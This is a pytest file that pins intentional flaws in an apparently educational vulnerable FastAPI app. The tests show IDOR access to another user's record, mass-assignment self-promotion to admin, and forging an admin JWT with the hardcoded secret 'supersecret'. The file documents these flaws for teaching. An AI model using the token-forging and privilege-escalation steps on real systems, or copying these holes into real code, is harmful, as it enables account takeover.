"""
Automated tests against the VULNERABLE app.

These tests DOCUMENT known, intentional vulnerabilities (BOLA/IDOR,
Mass Assignment, Weak JWT secret) rather than assert they are fixed.
Each assertion describes the app's actual (insecure) behavior, so if a
future change accidentally "fixes" vulnerable_app, these tests fail
just as loudly as if it broke further — the point of this file is to
keep the vulnerable app's behavior pinned exactly where the project's
documentation and exploit scripts say it is.

All requests go through FastAPI's TestClient, which calls the ASGI app
in-process (no real HTTP, no network sockets, no external hosts).
"""

from datetime import datetime, timedelta, timezone

import pytest
from fastapi.testclient import TestClient
from jose import jwt

import vulnerable_app.main as vuln_main
from vulnerable_app.seed_data import seed as seed_vulnerable

ALICE_USERNAME = "alice"
ALICE_PASSWORD = "alice_password123"

# The vulnerable app's hardcoded JWT secret (vulnerable_app/auth.py).
# Used here only to forge a token, exactly as a real attacker who read
# the (soon to be public) source code could.
KNOWN_WEAK_SECRET = "supersecret"


@pytest.fixture(autouse=True)
def reset_vulnerable_db():
    """Reseed the vulnerable database before every test for a clean, deterministic state."""
    seed_vulnerable()


@pytest.fixture
def client():
    return TestClient(vuln_main.app)


def login_alice(client: TestClient) -> str:
    r = client.post("/login", json={"username": ALICE_USERNAME, "password": ALICE_PASSWORD})
    assert r.status_code == 200
    return r.json()["access_token"]


def forge_token(sub: str, username: str, role: str) -> str:
    """Build a JWT signed with the known weak secret — never issued by /login."""
    claims = {
        "sub": sub,
        "username": username,
        "role": role,
        "exp": datetime.now(timezone.utc) + timedelta(minutes=30),
    }
    return jwt.encode(claims, KNOWN_WEAK_SECRET, algorithm="HS256")


# ---------------------------------------------------------------------------
# 1. INTENTIONAL VULNERABILITY DEMONSTRATION: BOLA / IDOR
#    (GET /users/{user_id} — see vulnerable_app/routers/users.py)
# ---------------------------------------------------------------------------
class TestVulnerableBOLA:
    """INTENTIONAL VULNERABILITY DEMONSTRATION — not a security guarantee."""

    def test_alice_can_view_her_own_profile(self, client):
        token = login_alice(client)
        r = client.get("/users/1", headers={"Authorization": f"Bearer {token}"})
        assert r.status_code == 200
        assert r.json()["id"] == 1

    def test_alice_token_can_view_bobs_profile_bola(self, client):
        """
        INTENTIONAL VULNERABILITY: Alice's own legitimate token, reused
        unmodified, retrieves Bob's (user_id=2) record with HTTP 200.
        A correctly authorized API would reject this — see
        secure_app's equivalent test, which asserts 403 instead.
        """
        token = login_alice(client)
        r = client.get("/users/2", headers={"Authorization": f"Bearer {token}"})
        assert r.status_code == 200
        assert r.json()["id"] == 2
        assert r.json()["username"] == "bob"


# ---------------------------------------------------------------------------
# 2. INTENTIONAL VULNERABILITY DEMONSTRATION: Mass Assignment
#    (PUT /users/{user_id} — see vulnerable_app/routers/users.py)
# ---------------------------------------------------------------------------
class TestVulnerableMassAssignment:
    """INTENTIONAL VULNERABILITY DEMONSTRATION — not a security guarantee."""

    def test_alice_can_self_promote_to_admin(self, client):
        """
        INTENTIONAL VULNERABILITY: sending "role": "admin" in a profile
        update is accepted and applied verbatim, letting Alice grant
        herself admin privileges despite authenticating as an ordinary
        user.
        """
        token = login_alice(client)
        headers = {"Authorization": f"Bearer {token}"}

        before = client.get("/users/1", headers=headers)
        assert before.json()["role"] == "user"

        r = client.put(
            "/users/1",
            headers=headers,
            json={"email": "alice_new@example.com", "role": "admin"},
        )
        assert r.status_code == 200
        assert r.json()["role"] == "admin"

        after = client.get("/users/1", headers=headers)
        assert after.json()["role"] == "admin"


# ---------------------------------------------------------------------------
# 3. INTENTIONAL VULNERABILITY DEMONSTRATION: Weak JWT secret
#    (GET /admin — see vulnerable_app/auth.py, JWT_SECRET_KEY)
# ---------------------------------------------------------------------------
class TestVulnerableWeakJWT:
    """INTENTIONAL VULNERABILITY DEMONSTRATION — not a security guarantee."""

    def test_alice_legitimate_token_cannot_access_admin(self, client):
        """Baseline: a real, unforged user token is correctly denied."""
        token = login_alice(client)
        r = client.get("/admin", headers={"Authorization": f"Bearer {token}"})
        assert r.status_code == 403

    def test_forged_token_with_known_secret_grants_admin(self, client):
        """
        INTENTIONAL VULNERABILITY: a JWT forged completely offline
        (never issued by /login), signed with the hardcoded weak secret
        "supersecret" and claiming sub="3" (the real admin's database
        ID), is accepted by the vulnerable app and grants full admin
        access — full account impersonation with no password needed.
        """
        forged_token = forge_token(sub="3", username="admin", role="admin")
        r = client.get("/admin", headers={"Authorization": f"Bearer {forged_token}"})
        assert r.status_code == 200
        assert r.json()["message"] == "Welcome to the admin area"


# ---------------------------------------------------------------------------
# REGRESSION TEST: non-numeric "sub" claim must not crash get_current_user()
#    (see vulnerable_app/auth.py — int(user_id) is now inside the
#    try/except so a bad "sub" returns 401, not an unhandled 500)
# ---------------------------------------------------------------------------
class TestGetCurrentUserRobustness:
    """SECURITY REGRESSION TEST — a non-numeric "sub" must yield 401, not 500."""

    def test_non_numeric_sub_returns_401_not_500(self, client):
        """
        A token signed with the known weak secret but carrying a
        non-numeric "sub" claim used to raise an unhandled ValueError
        inside get_current_user() (int(user_id) crashing on a string
        that isn't a valid integer), surfacing as a raw 500. It must
        now be rejected cleanly with 401, like any other malformed
        token.
        """
        forged_token = forge_token(sub="not-a-number", username="alice", role="user")
        r = client.get("/users/1", headers={"Authorization": f"Bearer {forged_token}"})
        assert r.status_code == 401
        assert r.json()["detail"] == "Could not validate credentials"
